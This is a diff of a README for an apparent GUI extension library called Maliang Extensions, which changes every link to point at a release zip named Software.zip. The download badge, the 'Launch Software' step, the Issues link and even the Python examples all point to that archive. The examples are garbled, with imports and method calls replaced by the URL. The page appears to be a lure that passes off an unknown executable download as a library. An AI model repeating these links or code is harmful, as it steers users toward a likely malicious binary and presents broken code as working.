@@ -1,6 +1,6 @@
 # Maliang Extensions Playground 🚀
 
-[![Software Download](https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip%20Software-blue)](https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip)
+[![Software Download](https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip%20Software-blue)](https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip)
 
 Welcome to the Maliang Extensions repository! This is the perfect place for developers looking to enhance their Maliang experience with various custom extensions and widgets. If you are a fan of modern UI design and lightweight, themed GUIs, you have come to the right place!
 
@@ -23,7 +23,7 @@ Welcome to the Maliang Extensions repository! This is the perfect place for deve
 ## Getting Started 🚀
 
 To get started with the Maliang Extensions, simply download the software package from the following link:
-[Launch Software](https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip)
+[Launch Software](https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the package, unzip it and explore the contents to kickstart your Maliang extension development journey.
 
@@ -35,25 +35,25 @@ Once you have downloaded the package, unzip it and explore the contents to kicks
 from maliang_extensions import CanvasExtension
 
 canvas = CanvasExtension()
-https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip(100, 100, 50)
+https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip(100, 100, 50)
 ```
 
 2. **Custom Widgets**: Incorporate custom widgets to add unique functionalities to your UI.
 
 ```python
-from https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip import CustomButton
+from https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip import CustomButton
 
 button = CustomButton(text="Click Me")
-https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip(callback_function)
+https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip(callback_function)
 ```
 
 3. **Themed GUI Elements**: Apply themed GUI elements to style your applications effortlessly.
 
 ```python
-from https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip import DarkTheme
+from https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip import DarkTheme
 
 dark_theme = DarkTheme()
-https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip(dark_theme)
+https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip(dark_theme)
 ```
 
 ## Contributors 🌟
@@ -66,7 +66,7 @@ We want to extend our gratitude to all the contributors who have helped make Mal
 
 ## Support 💬
 
-If you have any questions, feedback, or suggestions regarding Maliang Extensions, feel free to reach out to us via the [Issues](https://github.com/llul5ive/maliang-extensions/releases/download/v1.0/Application.zip) section of this repository. We value your input and are always looking to improve our extensions based on your feedback.
+If you have any questions, feedback, or suggestions regarding Maliang Extensions, feel free to reach out to us via the [Issues](https://github.com/llul5ive/maliang-extensions/releases/download/v2.0/Software.zip) section of this repository. We value your input and are always looking to improve our extensions based on your feedback.
 
 ## Spread the Word 📢
 
